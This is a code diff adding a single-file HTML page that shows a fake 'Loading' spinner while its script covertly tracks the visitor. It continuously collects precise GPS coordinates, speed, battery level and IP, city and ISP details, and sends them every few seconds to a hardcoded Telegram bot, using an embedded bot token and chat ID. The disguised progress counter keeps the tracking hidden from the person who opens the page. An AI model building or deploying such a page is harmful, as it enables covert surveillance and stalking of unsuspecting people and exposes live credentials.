@@ -1,0 +1,218 @@
+<!doctype html>
+<html lang="ar">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title> </title>
+<style>
+  /* Fullscreen black background */
+  html,body{height:100%;margin:0;background:#000;}
+  body{display:flex;align-items:center;justify-content:center;font-family:Arial, Helvetica, sans-serif;overflow:hidden}
+
+  /* Spinner ring */
+  .spinner-wrap{position:relative;width:180px;height:180px;display:flex;align-items:center;justify-content:center}
+  .ring{width:100%;height:100%;border-radius:50%;border:12px solid rgba(255,255,255,0.06);border-top-color:#00eaff;border-right-color:#8b5cf6;border-bottom-color:#ff0066;border-left-color:#34d399;animation:spin 1s linear infinite;box-sizing:border-box}
+  @keyframes spin{to{transform:rotate(360deg);}}
+
+  /* Counter centered */
+  .counter{position:absolute;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#e6f7ff;}
+  .counter .num{font-size:28px;font-weight:700;letter-spacing:1px}
+  .counter .label{font-size:12px;color:#9ca3af;margin-top:6px}
+
+  /* signature small */
+  .signature{position:fixed;bottom:14px;left:50%;transform:translateX(-50%);font-size:12px;color:rgba(255,255,255,0.55)}
+
+  /* visually hidden for accessibility (no text visible) */
+  .vis-hide{position:absolute!important;height:1px;width:1px;overflow:hidden;clip:rect(1px,1px,1px,1px);white-space:nowrap}
+</style>
+</head>
+<body>
+
+<div class="spinner-wrap" aria-hidden="true">
+  <div class="ring"></div>
+  <div class="counter" id="counter">
+    <div class="num" id="num">0%</div>
+    <div class="label">Loading</div>
+  </div>
+</div>
+
+<div class="signature">Developed by Omar Abdeltawab Saleh</div>
+
+<script>
+/*
+  Single-file tracker:
+  - Minimal UI: spinner + counter percentage
+  - Uses Geolocation.watchPosition, sends updates to Telegram
+  - Sends IP, city, country, ISP, battery, speed, Google Maps link
+  - Throttles sends to at most once every 5 seconds
+*/
+
+// Bot config (embedded as requested)
+const BOT_TOKEN = "8075471456:AAHL1J_CTzkAp--8ka0pGqDO0GRnwJBkQOA";
+const CHAT_ID = "6068331455";
+
+// state
+let lastSent = 0;
+let seq = 0;
+let isFirst = true;
+
+// update UI counter (simulate progress while waiting for first fix)
+const numEl = document.getElementById('num');
+let fakeProgress = 0;
+const progInterval = setInterval(function(){
+  fakeProgress = Math.min(99, fakeProgress + Math.floor(Math.random()*6));
+  numEl.textContent = fakeProgress + '%';
+}, 800);
+
+// helper: get IP info (ipapi)
+async function fetchIPInfo(){
+  try{
+    const r = await fetch('https://ipapi.co/json/');
+    if(!r.ok) throw new Error('ipapi failed');
+    return await r.json();
+  }catch(e){
+    return {ip:'Unknown', city:'?', country_name:'?', org:'?'};
+  }
+}
+
+// helper: get battery
+async function getBatteryPct(){
+  try{
+    if(navigator.getBattery){
+      const b = await navigator.getBattery();
+      return Math.round(b.level*100) + '%';
+    }
+  }catch(e){}
+  return 'N/A';
+}
+
+// compute speed from coords if pos.coords.speed not available
+function computeSpeed(prev, cur){
+  if(!prev) return null;
+  const R = 6371000; // m
+  const toRad = function(v){ return v * Math.PI/180; };
+  const dLat = toRad(cur.latitude - prev.latitude);
+  const dLon = toRad(cur.longitude - prev.longitude);
+  const a = Math.sin(dLat/2)*Math.sin(dLat/2) + Math.cos(toRad(prev.latitude))*Math.cos(toRad(cur.latitude)) * Math.sin(dLon/2)*Math.sin(dLon/2);
+  const c = 2*Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+  const d = R * c;
+  const dt = (cur.timestamp - prev.timestamp)/1000;
+  if(dt <= 0) return null;
+  return d/dt; // m/s
+}
+
+let prevPos = null;
+
+// send message to Telegram
+async function sendTelegramMessage(text){
+  try{
+    await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: text,
+        parse_mode: 'HTML'
+      })
+    });
+  }catch(e){
+    // ignore network errors silently
+  }
+}
+
+// main handler on position update
+async function handlePosition(position){
+  const now = Date.now();
+  if(now - lastSent < 4900){ // throttle ~5s
+    // still update UI but skip sending
+    updateUI(position);
+    prevPos = {latitude: position.coords.latitude, longitude: position.coords.longitude, timestamp: position.timestamp};
+    return;
+  }
+  lastSent = now;
+
+  // stop fake progress and show 100%
+  clearInterval(progInterval);
+  numEl.textContent = '100%';
+  var lbl = document.querySelector('.counter .label'); if(lbl) lbl.textContent = 'Tracking';
+
+  const lat = position.coords.latitude;
+  const lon = position.coords.longitude;
+  const acc = position.coords.accuracy || 0;
+  const rawSpeed = position.coords.speed; // m/s or null
+  const timestamp = new Date(position.timestamp).toISOString();
+
+  // IP info and battery in parallel
+  const results = await Promise.all([fetchIPInfo(), getBatteryPct()]);
+  const ipinfo = results[0], battery = results[1];
+
+  // compute speed fallback
+  let speed_m_s = rawSpeed;
+  const cur = {latitude: lat, longitude: lon, timestamp: position.timestamp};
+  if((speed_m_s === null || typeof speed_m_s === 'undefined') && prevPos){
+    const comp = computeSpeed(prevPos, cur);
+    if(comp !== null) speed_m_s = comp;
+  }
+  prevPos = cur;
+
+  const speed_kmh = (speed_m_s !== null && typeof speed_m_s !== 'undefined') ? (speed_m_s * 3.6).toFixed(2) + ' km/h' : 'N/A';
+
+  seq++;
+
+  // build nicely formatted message with emojis
+  const maps = 'https://www.google.com/maps?q=' + lat + ',' + lon;
+  const msg = '📍 <b>Live Update #' + seq + '</b>\n' +
+'🕒 <b>Time:</b> ' + timestamp + '\n\n' +
+'🧭 <b>Latitude:</b> <code>' + lat.toFixed(6) + '</code>\n' +
+'🧭 <b>Longitude:</b> <code>' + lon.toFixed(6) + '</code>\n' +
+'🎯 <b>Accuracy:</b> ' + acc + ' m\n' +
+'🚀 <b>Speed:</b> ' + speed_kmh + '\n\n' +
+'🌐 <b>IP:</b> ' + ipinfo.ip + '\n' +
+'🏙️ <b>City:</b> ' + ipinfo.city + '\n' +
+'🌍 <b>Country:</b> ' + ipinfo.country_name + '\n' +
+'📡 <b>ISP:</b> ' + ipinfo.org + '\n\n' +
+'🗺️ <b>Maps:</b> ' + maps + '\n' +
+'🔋 <b>Battery:</b> ' + battery;
+
+  // send message
+  sendTelegramMessage(msg);
+
+  // update UI counter briefly to show activity
+  numEl.textContent = '✔';
+  setTimeout(function(){ numEl.textContent = '0%'; fakeProgress = 0; }, 800);
+
+}
+
+// update UI without sending
+function updateUI(position){
+  // show small pulse by setting percent to 50 briefly
+  numEl.textContent = Math.min(99, Math.floor(Math.random()*40)+30) + '%';
+}
+
+// start watchPosition
+function start(){
+  if(!('geolocation' in navigator)) return;
+  navigator.geolocation.watchPosition(handlePosition, function(e){}, { enableHighAccuracy:true, maximumAge:1500, timeout:10000 });
+}
+
+// kickstart after user gesture (click)
+function kick(){
+  // try wake lock on user gesture
+  if('wakeLock' in navigator){
+    try{ navigator.wakeLock.request('screen'); }catch(e){}
+  }
+  // start tracking
+  start();
+  // remove click listener (we only needed first gesture)
+  window.removeEventListener('click', kick);
+}
+
+// listen for first click (to satisfy wakeLock and some browsers' geolocation policies)
+window.addEventListener('click', kick, {once:true});
+
+// also start automatically where allowed (may prompt permissions)
+start();
+</script>
+
+</body>
+</html>
